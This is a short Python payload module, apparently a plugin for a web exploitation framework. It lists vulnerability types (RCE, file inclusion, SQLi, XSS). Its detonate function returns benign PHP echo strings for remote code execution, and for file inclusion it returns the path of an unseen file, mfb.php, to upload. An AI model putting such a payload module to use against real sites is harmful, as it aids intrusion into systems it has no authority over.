import os

#
# RCE   Remote Code Execution
# FILEi File Inclusion
# SQLi  SQL Injection (write access)
# SQLr  SQL Read access
# XSSs  XSS Stored
# XSSr  XSS Reflected

##
# Dependency
# What dependency does this payload have
def get_dep():
    return ['RCEx', 'FILEi']

##
# Detonate payload
# Return the code to execut
# or the file path to be uploaded
def detonate(vuln):
    if vuln == 'RCE':
        # If we have RCE. Return PHP code
        return [
            "<?php echo 'Smitka RCE 1'; ?>",
            "<?php echo 'Smitka RCE 2'; ?>",
        ]

    elif vuln == 'FILEi':
        # If we have File inclusion
        # Return the file path of mfb.php
        return [os.path.dirname(os.path.realpath(__file__)) + '/mfb.php']
